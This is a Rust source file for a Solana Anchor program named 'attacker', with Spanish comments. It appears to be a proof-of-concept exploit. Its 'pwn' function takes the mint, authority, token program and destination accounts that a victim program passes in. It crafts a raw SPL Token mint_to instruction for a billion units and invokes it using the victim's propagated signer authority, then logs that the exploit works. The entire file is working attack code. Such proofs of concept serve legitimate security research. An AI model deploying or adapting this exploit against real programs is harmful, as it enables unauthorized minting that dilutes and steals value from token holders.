use anchor_lang::prelude::*;
use anchor_lang::solana_program::program::invoke;
use anchor_lang::solana_program::instruction::{Instruction, AccountMeta};

declare_id!("B3o9gVXc1ZygfgTnGVKX9Sjhkj5WjNG4vGb4rQqcRoeC");

#[program]
pub mod attacker {
    use super::*;

    pub fn pwn<'info>(ctx: Context<'_, '_, '_, 'info, Pwn>) -> Result<()> {
        let accs = ctx.remaining_accounts;
        // el victim pasa: [mint, authority, token_program, dest]
        let mint = &accs[0];
        let authority = &accs[1];
        let token_program = &accs[2];
        let dest = &accs[3];

        msg!("attacker: intentando mint_to con authority propagada {}", authority.key());

        let amount: u64 = 1_000_000_000;
        let mut data = vec![7u8];
        data.extend_from_slice(&amount.to_le_bytes());

        let ix = Instruction {
            program_id: token_program.key(),
            accounts: vec![
                AccountMeta::new(mint.key(), false),
                AccountMeta::new(dest.key(), false),
                AccountMeta::new_readonly(authority.key(), true),
            ],
            data,
        };

        invoke(&ix, &[mint.clone(), dest.clone(), authority.clone(), token_program.clone()])?;
        msg!("attacker: mint_to EJECUTADO - exploit funciona");
        Ok(())
    }
}

#[derive(Accounts)]
pub struct Pwn {}
